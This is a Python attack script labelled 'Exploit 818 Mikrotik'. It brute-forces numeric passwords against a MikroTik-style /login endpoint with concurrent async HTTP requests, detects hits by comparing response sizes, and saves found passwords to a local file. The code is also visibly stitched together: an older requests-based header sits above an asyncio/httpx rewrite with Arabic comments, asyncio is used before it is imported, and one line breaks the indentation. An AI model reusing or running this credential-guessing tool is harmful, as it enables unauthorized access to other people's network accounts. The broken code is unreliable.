*************************
# *** (EX-818-M) Exploit 818 Mikrotik ***
# * Version:
#   v1.1
# * Date:
#   19 - 08 - 2019 { Mon 19 Aug 2019 }
# * Facebook:
#   http://fb.com/mhm.hack
# * Author:
#   Hathem Ahmed
# *******************************************************************



import concurrent.futures
import threading
import os
import sys
import time
from re import split as SP
from random import randint
sys.path.append('../modules/')
from tools import agent as _USER_AGENT
from color import *
try:
    import requests
except ImportError:
    print("[!] Error import 'requests' model")
    exit()



def write(M, T):
    for c in M + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(T / 100)


def cou(word) -> int():
    n = 0
    for i in word:n += 1
    return n


def _PRINT(*args, **kwargs):
    _MSG = args[0].strip()
    return print(args[0])



def URL_CLEAR(*args, **kwargs):
    _RE_ = args[0]
    _RE_ = _RE_.replace("http://","") if 'http' in _RE_ else _RE_
    _RE_ = _RE_.rsplit("/")[0] if "/" in args[0] else _RE_
    return _RE_



def _WRITE_PASSWORD(*args, **kwargs):
    _FILE_ = open(os.path.join(os.getcwd(), 'Password.txt'), 'a')
    _FILE_.write(f"\n{'+'*5} Mr.WHM {'+'*5}\nPASSWORD: {args[0]}\n")
    
    _FILE_.close()

# نقوم بإنشاء قفل خاص بالطباعة لضمان عدم تداخل النصوص أثناء مسح الشاشة
print_lock = asyncio.Lock()


async def _INDEX(*args, **kwargs):
    # استخدام القفل لكي يقوم كل مسار بتحديث الشاشة بالترتيب وبدون فوضى
    async with print_lock:
        os.system("clear")

        # قراءة الحجم بأمان وبحروف صغيرة لتوافق httpx
        content_length = args[1].headers.get('content-length', '0')

        # حساب الوقت المستغرق للطلب
        try:
            timeout_seconds = args[1].elapsed.total_seconds()
        except Exception:
            timeout_seconds = "0.0"

        _PRINT(f"[ {Y}===>{N} ] Find {W}{args[3]}{N} Passwords and write in log\n")

        _P = (f"""    {R}[{N}    {args[0] + 1}    {R}]{N}
[{B} * {N}] SIZE     : {content_length} Bytes
[{B} * {N}] URL      : {URL_CLEAR(str(args[1].url))}
[{B} * {N}] PASSWORD : {args[2]}
[{B} * {N}] TIMEOUT  : {timeout_seconds}\n\n\n--- Enter Ctrl+C for (exit) ---""")

        _PRINT(_P)









import asyncio
import httpx
from random import randint
import sys

# متغيرات عامة للتحكم في الحسابات والفحص
_A_global = 0
FIND_global = 0
PROCESS_SIZE_global = 0
_R_global = True

# دالة الفحص لكل باسوورد (تعمل بشكل غير متزامن بالكامل)
async def _PROCESS_SINGLE_PASSWIRD(client, HOST, PASSWIRD):
    global _A_global, FIND_global, PROCESS_SIZE_global, _R_global

    # تحضير الـ User-Agent العشوائي لكل طلب كما في كودك الأصلي
    headers = {'User-Agent': _USER_AGENT(randint(0, 10))}
    _DATA = {"username": str(PASSWIRD)}

    try:
        # إرسال طلب POST بشكل غير متزامن (بديل لـ _S.post)
        # نرسل البيانات عبر data والأقسام الأخرى عبر headers
        response = await client.post(url=f"http://{HOST}/login", data=_DATA, headers=headers)

    except Exception:
        # في حال فشل الاتصال، نطبع رسالة الخطأ الخاصة بك
        _PRINT(f"[{R} - {N}] Sorry ERROR For Connection !!")
        # في نظام asyncio لا نستخدم sys.exit لأنها تقتل السكربت بالكامل، بل نكتفي بالخروج من المحاولة الحالية
        return

    # إدارة المتغيرات العامة والأحجام بطريقة متزامنة ذكية
    if _R_global is True:
        try:
            PROCESS_SIZE_global = int(response.headers.get('Content-Length', 0))
        except (KeyError, ValueError):
            pass
        _R_global = False

    current_process_size = PROCESS_SIZE_global
    current_A = _A_global
    current_find = FIND_global

    _A_global += 1

    try:
        content_length = int(response.headers.get('Content-Length', 0))
        status_code = response.status_code

        # التحقق من شروط النجاح الخاصة بك
        if content_length < current_process_size and status_code == 200:
            if current_process_size - content_length > 3000:
                # إرسال طلبات تسجيل الخروج وحذف الجلسة بشكل غير متزامن
                await client.get(url=f"http://{HOST}/logout", headers=headers)
                await client.delete(url=f"http://{HOST}/login", headers=headers)
                _WRITE_PASSWORD(PASSWIRD)

                _R_global = True
                FIND_global += 1
                current_find = FIND_global

        # استدعاء دالة الفهرسة المعتمدة لديك (نمرر response بدلاً من DATA)
      await _INDEX(current_A, response, PASSWIRD, current_find)

    except Exception:
        pass


# الدالة الأساسية لتوزيع المهام على الـ Async Engine
async def _ASYNC_PROCESS_DATA(HOST, MINNUM, MAXNUM):
    global _A_global, FIND_global, PROCESS_SIZE_global, _R_global
    _A_global = 0
    FIND_global = 0
    PROCESS_SIZE_global = 0
    _R_global = True

    ZERO = True if str(MINNUM).startswith("0") is False else False

    # تحديد حدود الاتصالات المتزامنة (مثلاً 20 طلباً في نفس الجزء من الثانية)
    limits = httpx.Limits(max_keepalive_connections=20, max_connections=50)

    # إنشاء عميل اتصال غير متزامن واحد يدير كل الطلبات بكفاءة عالية
    async with httpx.AsyncClient(limits=limits, timeout=5.0) as client:
        tasks = []
        for PASSWIRD in range(int(MINNUM), int(MAXNUM)):
            formatted_password = PASSWIRD if ZERO is True else f"0{PASSWIRD}"

            # تجهيز المهمة في الخلفية دون انتظار
            task = asyncio.create_task(_PROCESS_SINGLE_PASSWIRD(client, HOST, formatted_password))
            tasks.append(task)

        # إطلاق جميع العمليات دفعة واحدة وبسرعة قصوى
        await asyncio.gather(*tasks)


# الدالة الرئيسية التي تستبدل دالتك القديمة تماماً وتوافق الكلاس الخاص بك
def _PROCESS_DATA(*args, **kwargs):
    HOST, MINNUM, MAXNUM = args
    # تشغيل محرك asyncio
    asyncio.run(_ASYNC_PROCESS_DATA(HOST, MINNUM, MAXNUM))


def _SERVER_SYS(*args, **kwargs):
    HOST, MINNUM, MAXNUM = args
    _PROCESS_DATA(URL_CLEAR(HOST), MINNUM, MAXNUM)


class MAIN(object):
    def __init__(self):
        pass

    def run(self, HOST, MINNUM, MAXNUM):
        _SERVER_SYS(HOST, MINNUM, MAXNUM)
